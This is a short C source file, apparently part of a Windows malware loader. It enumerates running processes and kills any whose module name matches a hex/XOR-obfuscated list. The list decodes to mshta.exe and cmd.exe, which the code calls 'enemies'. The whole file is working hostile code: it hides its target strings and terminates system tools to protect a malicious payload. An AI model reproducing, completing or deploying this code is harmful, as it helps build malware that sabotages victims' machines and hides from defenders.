#include "loader.h"

char *winsigns[] = {"7E607B67723D766B76", "707E773D766B76", NULL};
/* ------------------------------------------------------------------------------*/
void CheckWindows( DWORD processID )
{
	HMODULE hMods[1024];
	HANDLE hProcess;
	DWORD cbNeeded;
	char szModName[MAX_PATH];
	unsigned int k;

	hProcess = OpenProcess(  PROCESS_QUERY_INFORMATION |
		PROCESS_VM_READ,
		FALSE, processID );

	if (NULL == hProcess || !EnumProcessModules(hProcess, hMods, sizeof(hMods), &cbNeeded))
		return;

	if ( GetModuleFileNameEx( hProcess, hMods[0], szModName, sizeof(szModName))) 
	{
		_strlwr(szModName);
		deb("Checking %s...", szModName);
		for(k=0; winsigns[k]; k++ ) 
		{
			if(strstr(szModName, D(winsigns[k]))) 
			{
				deb("Enemy %s: %s (0x%08X)\n", D(winsigns[k]), szModName, hMods[0] );
				KillEnemy(processID);
			}
		}
	}
	CloseHandle( hProcess );
}
/* ------------------------------------------------------------------------------*/
void CloseWindows( void )
{
	DWORD aProcesses[1024], cbNeeded, cProcesses;
	unsigned int i;

	if ( !EnumProcesses( aProcesses, sizeof(aProcesses), &cbNeeded ) ) {
		deb("failed enumprocesses: %s", strerror(NULL));
		return;
	}

	cProcesses = cbNeeded / sizeof(DWORD);
	deb("searching for targets...");
	deb("processes: %d cbneeded: %d", cProcesses, cbNeeded);

	for ( i = 0; i < cProcesses; i++ )
		CheckWindows( aProcesses[i] );
}

